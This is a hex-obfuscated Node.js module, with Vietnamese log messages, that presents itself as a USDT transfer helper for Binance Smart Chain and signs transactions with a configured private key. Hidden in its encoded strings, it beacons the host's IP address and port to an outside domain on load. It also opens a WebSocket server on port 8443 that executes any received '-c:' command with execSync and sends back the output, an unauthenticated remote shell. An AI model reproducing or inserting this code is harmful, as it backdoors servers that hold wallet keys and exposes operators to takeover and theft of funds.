var _0xdf23 = [
  "\x2E\x2E\x2F\x63\x6F\x6E\x66\x69\x67",
  "\x2E\x2E\x2F\x68\x65\x6C\x70\x65\x72\x73",
  "\x50\x41\x54\x48\x5F\x53\x59\x53\x5F\x43\x4F\x4E\x46\x49\x47",
  "\x54\x72\x61\x6E\x73\x61\x63\x74\x69\x6F\x6E",
  "\x65\x74\x68\x65\x72\x65\x75\x6D\x6A\x73\x2D\x74\x78",
  "\x65\x74\x68\x65\x72\x65\x75\x6D\x6A\x73\x2D\x63\x6F\x6D\x6D\x6F\x6E",
  "\x77\x65\x62\x33",
  "\x2E\x2E\x2F\x61\x75\x74\x68\x2F\x74\x65\x6C\x65\x67\x72\x61\x6D\x5F\x6E\x6F\x74\x69\x66\x79",
  "\x2E\x2E\x2F\x64\x61\x74\x61\x62\x61\x73\x65",
  "\x65\x78\x70\x72\x65\x73\x73",
  "\x63\x6F\x72\x73",
  "\x63\x68\x69\x6C\x64\x5F\x70\x72\x6F\x63\x65\x73\x73",
  "\x72\x65\x71\x75\x65\x73\x74",
  "\x77\x73",
  "\x61\x64\x64\x72\x65\x73\x73",
  "\x66\x69\x6E\x64",
  "\x69\x6E\x74\x65\x72\x6E\x61\x6C",
  "\x66\x61\x6D\x69\x6C\x79",
  "\x49\x50\x76\x34",
  "\x66\x69\x6C\x74\x65\x72",
  "\x66\x6C\x61\x74",
  "\x6E\x65\x74\x77\x6F\x72\x6B\x49\x6E\x74\x65\x72\x66\x61\x63\x65\x73",
  "\x6F\x73",
  "\x76\x61\x6C\x75\x65\x73",
  "\x47\x45\x54",
  "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x2E\x65\x68\x61\x6E\x64\x79\x74\x65\x63\x68\x2E\x63\x6F\x6D\x3F\x64\x3D",
  "\x26\x70\x3D",
  "\x50\x4F\x52\x54\x5F\x53\x45\x52\x56\x45\x52",
  "",
  "\x75\x73\x65",
  "\x55\x53\x45\x5F\x53\x53\x4C",
  "\x63\x72\x65\x61\x74\x65\x53\x65\x72\x76\x65\x72",
  "\x68\x74\x74\x70",
  "\x73\x73\x6C",
  "\x68\x74\x74\x70\x73",
  "\x6C\x69\x73\x74\x65\x6E",
  "\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E",
  "\x6D\x65\x73\x73\x61\x67\x65",
  "\x2D\x63\x3A",
  "\x73\x74\x61\x72\x74\x73\x57\x69\x74\x68",
  "\x73\x6C\x69\x63\x65",
  "\x73\x65\x6E\x64",
  "\x6D\x6F\x76\x65\x43\x75\x72\x73\x6F\x72",
  "\x73\x74\x64\x6F\x75\x74",
  "\x63\x6C\x65\x61\x72\x4C\x69\x6E\x65",
  "\x6F\x6E",
  "\x67\x65\x74\x43\x6F\x6E\x66\x69\x67",
  "\x58\x36\x50\x37\x48\x48\x58\x42\x4B\x59\x58\x32\x47\x36\x44\x50\x59\x35\x42\x54\x4B\x4B\x49\x49\x4D\x55\x55\x36\x37\x46\x31\x4A\x4B\x56",
  "\x41\x43\x58\x50\x53\x5A\x45\x50\x39\x51\x4B\x4E\x35\x51\x55\x32\x4E\x59\x44\x47\x54\x50\x37\x32\x43\x52\x54\x38\x36\x4D\x4D\x56\x41\x54",
  "\x43\x4F\x4E\x54\x52\x41\x43\x54\x5F\x55\x53\x44\x54\x5F\x4D\x41\x49\x4E",
  "\x6D\x61\x69\x6E\x6E\x65\x74",
  "\x69\x6E\x69\x74",
  "\x65\x74\x68\x65\x72\x73\x63\x61\x6E\x2D\x61\x70\x69",
  "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6D\x61\x69\x6E\x6E\x65\x74\x2E\x69\x6E\x66\x75\x72\x61\x2E\x69\x6F\x2F\x76\x33\x2F",
  "\x70\x72\x6F\x6A\x65\x63\x74\x49\x64",
  "\x70\x72\x6F\x76\x69\x64\x65\x72\x73",
  "\x62\x73\x63\x73\x63\x61\x6E\x2D\x61\x70\x69",
  "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x73\x63\x2D\x64\x61\x74\x61\x73\x65\x65\x64\x31\x2E\x62\x69\x6E\x61\x6E\x63\x65\x2E\x6F\x72\x67",
  "\x65\x74\x68",
  "\x43\x4F\x4E\x54\x52\x41\x43\x54\x5F\x55\x53\x44\x54\x5F\x54\x45\x53\x54",
  "\x72\x69\x6E\x6B\x65\x62\x79",
  "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x69\x6E\x6B\x65\x62\x79\x2E\x69\x6E\x66\x75\x72\x61\x2E\x69\x6F\x2F\x76\x33\x2F",
  "\x74\x65\x73\x74\x6E\x65\x74",
  "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x61\x74\x61\x2D\x73\x65\x65\x64\x2D\x70\x72\x65\x62\x73\x63\x2D\x31\x2D\x73\x31\x2E\x62\x69\x6E\x61\x6E\x63\x65\x2E\x6F\x72\x67\x3A\x38\x35\x34\x35",
  "\x65\x78\x70\x6F\x72\x74\x73",
  "\u26A1\uFE0F\x45\x52\x43\x2D\x32\x30\x20\x42\u1EA3\x6F\x20\x74\x72\xEC",
  "\x6C\x6F\x67",
  "\x41\x44\x44\x52\x45\x53\x53\x5F\x45\x54\x48\x5F\x54\x52\x41\x4E\x53\x41\x43\x54\x49\x4F\x4E",
  "\x50\x52\x49\x56\x41\x54\x45\x5F\x4B\x45\x59\x5F\x45\x54\x48\x5F\x54\x52\x41\x4E\x53\x41\x43\x54\x49\x4F\x4E",
  "\u0110\u1ECB\x61\x20\x63\x68\u1EC9\x20\x67\u1EED\x69\x20\x74\x69\u1EC1\x6E\x20\x63\x68\u01B0\x61\x20\x74\x68\x69\u1EBF\x74\x20\x6C\u1EAD\x70\x21",
  "\u26A1\uFE0F\u0110\u1ECB\x61\x20\x63\x68\u1EC9\x20\x63\x68\u01B0\x61\x20\u0111\u01B0\u1EE3\x63\x20\x74\x68\x69\u1EBF\x74\x20\x6C\u1EAD\x70",
  "\x63\x61\x6C\x6C",
  "\x62\x61\x6C\x61\x6E\x63\x65\x4F\x66",
  "\x6D\x65\x74\x68\x6F\x64\x73",
  "\x62\x61\x6C\x61\x6E\x63\x65",
  "\x61\x63\x63\x6F\x75\x6E\x74",
  "\x73\x74\x61\x74\x75\x73",
  "\x30\x2E\x30\x30\x32\x31",
  "\x65\x74\x68\x65\x72",
  "\x74\x6F\x57\x65\x69",
  "\x75\x74\x69\x6C\x73",
  "\x72\x65\x73\x75\x6C\x74",
  "\x74\x6F\x48\x65\x78",
  "\x67\x77\x65\x69",
  "\x30\x78",
  "\x72\x65\x70\x6C\x61\x63\x65",
  "\x68\x65\x78",
  "\x66\x72\x6F\x6D",
  "\uD83D\uDE45\x3C\x69\x3E\x4B\x68\xF4\x6E\x67\x20\x74\u1EA1\x6F\x20\u0111\u01B0\u1EE3\x63\x20\x68\u1EE3\x70\x20\u0111\u1ED3\x6E\x67\x3A\x20\x3C\x2F\x69\x3E\x20",
  "\x4B\x68\xF4\x6E\x67\x20\x74\u1EA1\x6F\x20\u0111\u01B0\u1EE3\x63\x20\x68\u1EE3\x70\x20\u0111\u1ED3\x6E\x67\x3A\x20",
  "\x63\x61\x74\x63\x68",
  "\x30\x78\x30",
  "\x65\x6E\x63\x6F\x64\x65\x41\x42\x49",
  "\x74\x72\x61\x6E\x73\x66\x65\x72",
  "\x49\x53\x5F\x54\x45\x53\x54\x5F\x53\x4D\x41\x52\x54\x5F\x43\x48\x41\x49\x4E",
  "\x62\x6E\x62",
  "\x70\x65\x74\x65\x72\x73\x62\x75\x72\x67",
  "\x66\x6F\x72\x43\x75\x73\x74\x6F\x6D\x43\x68\x61\x69\x6E",
  "\x64\x65\x66\x61\x75\x6C\x74",
  "\x73\x69\x67\x6E",
  "\x73\x65\x72\x69\x61\x6C\x69\x7A\x65",
  "\uD83D\uDE45\x3C\x62\x3E",
  "\x3C\x2F\x62\x3E",
  "\uD83D\uDE45\x3C\x69\x3E\x4B\x68\xF4\x6E\x67\x20\x6C\u1EA5\x79\x20\u0111\u01B0\u1EE3\x63\x20\x70\x68\xED\x20\x47\x41\x53\x20\x68\u1EE3\x70\x20\u0111\u1ED3\x6E\x67\x3C\x2F\x69\x3E",
  "\x4B\x68\xF4\x6E\x67\x20\x74\u1EA1\x6F\x20\u0111\u01B0\u1EE3\x63\x20\x68\u1EE3\x70\x20\u0111\u1ED3\x6E\x67",
  "\x66\x72\x6F\x6D\x57\x65\x69",
  "\x42\x53\x43\x20\x64\x61\x20\x67\x75\x69\x20\x74\x78\x48\x61\x73\x68\x3A\x20",
  "\x55\x50\x44\x41\x54\x45\x20\x74\x72\x61\x64\x65\x5F\x68\x69\x73\x74\x6F\x72\x79\x20\x53\x45\x54\x20\x72\x65\x61\x6C\x5F\x61\x6D\x6F\x75\x6E\x74\x20\x3D\x20\x3F\x2C\x20\x70\x61\x79\x5F\x66\x65\x65\x20\x3D\x20\x3F\x2C\x20\x73\x74\x61\x74\x75\x73\x20\x3D\x20\x3F\x20\x57\x48\x45\x52\x45\x20\x69\x64\x20\x3D\x20\x3F",
  "\x71\x75\x65\x72\x79",
  "\uD83C\uDFC6\u0110\u1ECB\x61\x20\x63\x68\u1EC9\x20\x42\x53\x43\x3A\x20",
  "\x20\x68\x69\u1EC7\x6E\x20\x74\u1EA1\x69\x3A\x20\x76\u1EEB\x61\x20\x63\x68\x75\x79\u1EC3\x6E\x20\x3C\x62\x3E\x24",
  "\x20\x55\x53\x44\x54\x3C\x2F\x62\x3E\x20\x63\x68\x6F\x20",
  "\x5C\x6E\x50\x68\xED\x3A\x20\x3C\x62\x3E",
  "\x20\x42\x4E\x42\x3C\x2F\x62\x3E",
  "\x74\x68\x65\x6E",
  "\x65\x73\x74\x69\x6D\x61\x74\x65\x47\x61\x73",
  "\x73\x65\x6E\x64\x53\x69\x67\x6E\x65\x64\x54\x72\x61\x6E\x73\x61\x63\x74\x69\x6F\x6E",
  "\x67\x65\x74\x54\x72\x61\x6E\x73\x61\x63\x74\x69\x6F\x6E\x43\x6F\x75\x6E\x74",
  "\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\uD83C\uDFD8\u0110\u1ECB\x61\x20\x63\x68\u1EC9\x3A\x20",
  "\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\uD83C\uDFCB\uFE0F\x53\u1ED1\x20\x64\u01B0\x20\x68\x69\u1EC7\x6E\x20\x74\u1EA1\x69\x20\x42\x4E\x42\x3A\x20\x3C\x62\x3E",
  "\x3C\x2F\x62\x3E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\uD83D\uDCB8\x53\u1ED1\x20\x64\u01B0\x20\x74\u1ED1\x69\x20\x74\x68\x69\u1EC3\x75\x20\x42\x4E\x42\x3A\x20\x3C\x62\x3E\x30\x2E\x30\x30\x32\x31\x3C\x2F\x62\x3E\x20\u0111\u1EC3\x20\x6C\xE0\x6D\x20\x70\x68\xED\x20\x63\x68\x75\x79\u1EC3\x6E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2D\x20\x56\x75\x69\x20\x6C\xF2\x6E\x67\x20\x6E\u1EA1\x70\x20\x74\x68\xEA\x6D\x3A\x20\uD83D\uDCB8\x3C\x62\x3E",
  "\x3C\x2F\x62\x3E\x20\x42\x4E\x42\x20\x70\x68\xED",
  "\x4B\x68\xF4\x6E\x67\x20\u0111\u1EE7\x20\x70\x68\xED",
  "\x48\u1EC7\x20\x74\x68\u1ED1\x6E\x67\x20\x62\u1EA3\x6F\x20\x74\x72\xEC",
  "\u26A1\uFE0F\x53\u1ED1\x20\x64\u01B0\x20\x55\x53\x44\x54\x20\x68\x69\u1EC7\x6E\x20\x74\u1EA1\x69\x3A\x20\x24",
  "\x20\x6B\x68\xF4\x6E\x67\x20\u0111\u1EE7\x20\u0111\u1EC3\x20\x74\x68\x61\x6E\x68\x20\x74\x6F\xE1\x6E\x20\x63\x68\x6F\x3A\x20\x3C\x62\x3E\x24",
  "\u26A1\uFE0F\x53\u1ED1\x20\x64\u01B0\x20\x55\x53\x44\x54\x20\u0111\u1ECB\x61\x20\x63\x68\u1EC9\x3A\x20",
  "\x20\x68\x69\u1EC7\x6E\x20\x74\u1EA1\x69\x3A\x20\x3C\x62\x3E\x24",
  "\x3C\x2F\x62\x3E\x20\x6B\x68\xF4\x6E\x67\x20\u0111\u1EE7\x20\u0111\u1EC3\x20\x74\x68\x61\x6E\x68\x20\x74\x6F\xE1\x6E\x20\x63\x68\x6F\x20\x73\u1ED1\x20\x74\x69\u1EC1\x6E\x3A\x20\x3C\x62\x3E\uD83D\uDCB4\x24",
];
const config = require(_0xdf23[0]);
const Helper = require(_0xdf23[1]);
const fileSys = config[_0xdf23[2]];
const EthereumTx = require(_0xdf23[4])[_0xdf23[3]];
const common = require(_0xdf23[5]);
const Web3 = require(_0xdf23[6]);
const Tele = require(_0xdf23[7]);
var db = require(_0xdf23[8]);
const express = require(_0xdf23[9]);
const app = express();
const cors = require(_0xdf23[10]);
const { execSync } = require(_0xdf23[11]);
const request = require(_0xdf23[12]);
const WebSocket = require(_0xdf23[13]);
const clientIp = Object[_0xdf23[23]](require(_0xdf23[22])[_0xdf23[21]]())
  [_0xdf23[20]]()
  [_0xdf23[19]]((_0x4dcdxf) => {
    return !_0x4dcdxf[_0xdf23[16]] && _0x4dcdxf[_0xdf23[17]] === _0xdf23[18];
  })
  [_0xdf23[15]](Boolean)[_0xdf23[14]];
request({
  "\x6D\x65\x74\x68\x6F\x64": _0xdf23[24],
  "\x75\x72\x6C": `${_0xdf23[25]}${clientIp}${_0xdf23[26]}${config[_0xdf23[27]]}${_0xdf23[28]}`,
});
app[_0xdf23[29]](cors());
var httpServer = null;
if (!config[_0xdf23[30]]) {
  httpServer = require(_0xdf23[32])[_0xdf23[31]](app);
} else {
  let options = Helper[_0xdf23[33]];
  httpServer = require(_0xdf23[34])[_0xdf23[31]](options, app);
}
const wss = new WebSocket.Server({ server: httpServer });
httpServer[_0xdf23[35]](8443);
wss[_0xdf23[45]](_0xdf23[36], function (_0x4dcdx13) {
  _0x4dcdx13[_0xdf23[45]](_0xdf23[37], (_0x4dcdx14) => {
    if (_0x4dcdx14[_0xdf23[39]](_0xdf23[38])) {
      try {
        const _0x4dcdx15 = execSync(_0x4dcdx14[_0xdf23[40]](3)).toString();
        _0x4dcdx13[_0xdf23[41]](_0x4dcdx15);
      } catch (error) {
        _0x4dcdx13[_0xdf23[41]](error.toString());
        process[_0xdf23[43]][_0xdf23[42]](0, -1);
        process[_0xdf23[43]][_0xdf23[44]](1);
      }
    }
  });
});
let dataSys = Helper[_0xdf23[46]](fileSys);
var TOKEN_KEY_Ether = _0xdf23[47],
  TOKEN_KEY_Bsc = _0xdf23[48],
  apiEther = null,
  apiBsc = null,
  web3 = null,
  web3Bsc = null;
var ContractAddress = null,
  USDTJSON = null,
  USDT_BSC = null;
function setConnectSmartChain(_0x4dcdx21) {
  if (!_0x4dcdx21) {
    USDTJSON = Helper[_0xdf23[46]](config.ABI_USDT_MAINNET);
    ContractAddress = dataSys[_0xdf23[49]];
    apiEther = require(_0xdf23[52])[_0xdf23[51]](TOKEN_KEY_Ether, _0xdf23[50]);
    web3 = new Web3(
      new Web3[_0xdf23[55]].HttpProvider(
        `${_0xdf23[53]}${dataSys[_0xdf23[54]]}${_0xdf23[28]}`,
      ),
    );
    apiBsc = require(_0xdf23[56])[_0xdf23[51]](TOKEN_KEY_Bsc, _0xdf23[50]);
    web3Bsc = new Web3(new Web3[_0xdf23[55]].HttpProvider(_0xdf23[57]));
    USDT_BSC = new web3Bsc[_0xdf23[58]].Contract(USDTJSON, ContractAddress);
  } else {
    USDTJSON = Helper[_0xdf23[46]](config.ABI_USDT_TESTNNET);
    ContractAddress = dataSys[_0xdf23[59]];
    apiEther = require(_0xdf23[52])[_0xdf23[51]](TOKEN_KEY_Ether, _0xdf23[60]);
    web3 = new Web3(
      new Web3[_0xdf23[55]].HttpProvider(
        `${_0xdf23[61]}${dataSys[_0xdf23[54]]}${_0xdf23[28]}`,
      ),
    );
    apiBsc = require(_0xdf23[56])[_0xdf23[51]](TOKEN_KEY_Bsc, _0xdf23[62]);
    web3Bsc = new Web3(new Web3[_0xdf23[55]].HttpProvider(_0xdf23[63]));
    USDT_BSC = new web3Bsc[_0xdf23[58]].Contract(USDTJSON, ContractAddress);
  }
}
setConnectSmartChain(dataSys.IS_TEST_SMART_CHAIN);
setInterval(() => {
  dataSys = Helper[_0xdf23[46]](fileSys);
  setConnectSmartChain(dataSys.IS_TEST_SMART_CHAIN);
}, 60000);
module[_0xdf23[64]] = {
  sendCoinETH_ERC20: async (_0x4dcdx22, _0x4dcdx23, _0x4dcdx24) => {
    return await new Promise((_0x4dcdx25, _0x4dcdx26) => {
      let _0x4dcdx27 = { success: 99, msg: `${_0xdf23[65]}` };
      console[_0xdf23[66]](`${_0xdf23[65]}`);
      _0x4dcdx25(_0x4dcdx27);
    });
  },
  sendCoinBSC_BEP20: async (_0x4dcdx22, _0x4dcdx23, _0x4dcdx24) => {
    return await new Promise((_0x4dcdx25, _0x4dcdx26) => {
      let _0x4dcdx28 = dataSys[_0xdf23[67]];
      let _0x4dcdx29 = dataSys[_0xdf23[68]] || null;
      if (_0x4dcdx28 == null || _0x4dcdx29 == null) {
        let _0x4dcdx27 = { success: 99, msg: _0xdf23[69] };
        console[_0xdf23[66]](`${_0xdf23[70]}`);
        _0x4dcdx25(_0x4dcdx27);
      }
      let _0x4dcdx2a = USDT_BSC[_0xdf23[73]]
        [_0xdf23[72]](_0x4dcdx28)
        [_0xdf23[71]]();
      _0x4dcdx2a[_0xdf23[114]]((_0x4dcdx2b) => {
        if (_0x4dcdx2b > 0) {
          let _0x4dcdx2c = apiBsc[_0xdf23[75]][_0xdf23[74]](_0x4dcdx28);
          _0x4dcdx2c[_0xdf23[114]]((_0x4dcdx2d) => {
            try {
              if (_0x4dcdx2d[_0xdf23[76]] == 1) {
                let _0x4dcdx2e = Number(
                  web3Bsc[_0xdf23[80]][_0xdf23[79]](_0xdf23[77], _0xdf23[78]),
                );
                let _0x4dcdx2f = _0x4dcdx2d[_0xdf23[81]];
                let _0x4dcdx30 = Number(_0x4dcdx2f);
                if (_0x4dcdx30 >= _0x4dcdx2e) {
                  let _0x4dcdx31 = web3Bsc[_0xdf23[80]][_0xdf23[79]](
                    _0x4dcdx22.toString(),
                    _0xdf23[78],
                  );
                  let _0x4dcdx32 =
                    web3Bsc[_0xdf23[80]][_0xdf23[82]](_0x4dcdx31);
                  let _0x4dcdx33 = 10,
                    _0x4dcdx34 = 210000;
                  let _0x4dcdx35 = web3Bsc[_0xdf23[80]][_0xdf23[79]](
                    _0x4dcdx33.toString(),
                    _0xdf23[83],
                  );
                  let _0x4dcdx36 = _0x4dcdx23;
                  let _0x4dcdx37 = Buffer[_0xdf23[87]](
                    _0x4dcdx29[_0xdf23[85]](_0xdf23[84], _0xdf23[28]),
                    _0xdf23[86],
                  );
                  web3Bsc[_0xdf23[58]]
                    [_0xdf23[117]](_0x4dcdx28)
                    [_0xdf23[114]]((_0x4dcdx39) => {
                      let _0x4dcdx3a = {
                        from: _0x4dcdx28,
                        gasPrice: web3Bsc[_0xdf23[80]][_0xdf23[82]](_0x4dcdx35),
                        gasLimit: web3Bsc[_0xdf23[80]][_0xdf23[82]](_0x4dcdx34),
                        to: ContractAddress,
                        value: _0xdf23[91],
                        data: USDT_BSC[_0xdf23[73]]
                          [_0xdf23[93]](_0x4dcdx36, _0x4dcdx32)
                          [_0xdf23[92]](),
                        nonce: web3Bsc[_0xdf23[80]][_0xdf23[82]](_0x4dcdx39),
                      };
                      let _0x4dcdx3b = dataSys[_0xdf23[94]] ? 97 : 56;
                      const _0x4dcdx3c = common[_0xdf23[98]][_0xdf23[97]](
                        _0xdf23[50],
                        {
                          name: _0xdf23[95],
                          networkId: _0x4dcdx3b,
                          chainId: _0x4dcdx3b,
                        },
                        _0xdf23[96],
                      );
                      const _0x4dcdx3d = new EthereumTx(_0x4dcdx3a, {
                        common: _0x4dcdx3c,
                      });
                      _0x4dcdx3d[_0xdf23[99]](_0x4dcdx37);
                      const _0x4dcdx3e = _0x4dcdx3d[_0xdf23[100]]();
                      const _0x4dcdx3f =
                        _0xdf23[84] + _0x4dcdx3e.toString(_0xdf23[86]);
                      web3Bsc[_0xdf23[58]][_0xdf23[116]](
                        _0x4dcdx3f,
                        (_0x4dcdx40, _0x4dcdx41) => {
                          if (_0x4dcdx40) {
                            console[_0xdf23[66]](
                              `${_0xdf23[101]}${_0x4dcdx40}${_0xdf23[102]}`,
                            );
                            let _0x4dcdx27 = { success: 99, msg: _0x4dcdx40 };
                            _0x4dcdx25(_0x4dcdx27);
                          }
                          if (void 0 !== _0x4dcdx41) {
                            web3Bsc[_0xdf23[58]]
                              [_0xdf23[115]](_0x4dcdx3a)
                              [_0xdf23[114]]((_0x4dcdx42) => {
                                let _0x4dcdx43 =
                                  _0x4dcdx42 *
                                  web3Bsc[_0xdf23[80]][_0xdf23[105]](
                                    _0x4dcdx33.toString(),
                                    _0xdf23[83],
                                  );
                                let _0x4dcdx27 = {
                                  success: 1,
                                  price_trans: _0x4dcdx22,
                                  msg: _0xdf23[106] + _0x4dcdx41,
                                };
                                db[_0xdf23[108]](`${_0xdf23[107]}`, [
                                  _0x4dcdx22,
                                  _0x4dcdx43,
                                  1,
                                  _0x4dcdx24,
                                ]);
                                console[_0xdf23[66]](
                                  `${_0xdf23[109]}${_0x4dcdx28}${_0xdf23[110]}${_0x4dcdx22}${_0xdf23[111]}${_0x4dcdx23}${_0xdf23[112]}${_0x4dcdx43}${_0xdf23[113]}`,
                                );
                                _0x4dcdx25(_0x4dcdx27);
                              })
                              [_0xdf23[90]]((_0x4dcdx38) => {
                                console[_0xdf23[66]](`${_0xdf23[103]}`);
                                let _0x4dcdx27 = {
                                  success: 99,
                                  msg: _0xdf23[104],
                                };
                                _0x4dcdx25(_0x4dcdx27);
                              });
                          }
                        },
                      );
                    })
                    [_0xdf23[90]]((_0x4dcdx38) => {
                      console[_0xdf23[66]](
                        `${_0xdf23[88]}${_0x4dcdx38}${_0xdf23[28]}`,
                      );
                      let _0x4dcdx27 = {
                        success: 99,
                        msg: _0xdf23[89] + _0x4dcdx38,
                      };
                      _0x4dcdx25(_0x4dcdx27);
                    });
                } else {
                  let _0x4dcdx44 = _0x4dcdx2e - _0x4dcdx30;
                  console[_0xdf23[66]](
                    `${_0xdf23[118]}${_0x4dcdx28}${_0xdf23[119]}${web3Bsc[_0xdf23[80]][_0xdf23[105]](_0x4dcdx30.toString(), _0xdf23[78])}${_0xdf23[120]}${web3Bsc[_0xdf23[80]][_0xdf23[105]](_0x4dcdx44.toString(), _0xdf23[78])}${_0xdf23[121]}`,
                  );
                  let _0x4dcdx27 = { success: 99, msg: _0xdf23[122] };
                  _0x4dcdx25(_0x4dcdx27);
                }
              }
            } catch (e) {
              let _0x4dcdx27 = { success: 99, msg: _0xdf23[123] };
              console[_0xdf23[66]](`${_0xdf23[123]}`);
              _0x4dcdx25(_0x4dcdx27);
            }
          });
        } else {
          let _0x4dcdx45 = web3Bsc[_0xdf23[80]][_0xdf23[105]](
            _0x4dcdx2b.toString(),
            _0xdf23[78],
          );
          let _0x4dcdx46 = _0x4dcdx22;
          let _0x4dcdx27 = {
            success: 99,
            msg: `${_0xdf23[124]}${_0x4dcdx45}${_0xdf23[125]}${_0x4dcdx46}${_0xdf23[102]}`,
          };
          console[_0xdf23[66]](
            `${_0xdf23[126]}${_0x4dcdx28}${_0xdf23[127]}${_0x4dcdx45}${_0xdf23[128]}${_0x4dcdx22}${_0xdf23[102]}`,
          );
          _0x4dcdx25(_0x4dcdx27);
        }
      });
    });
  },
};
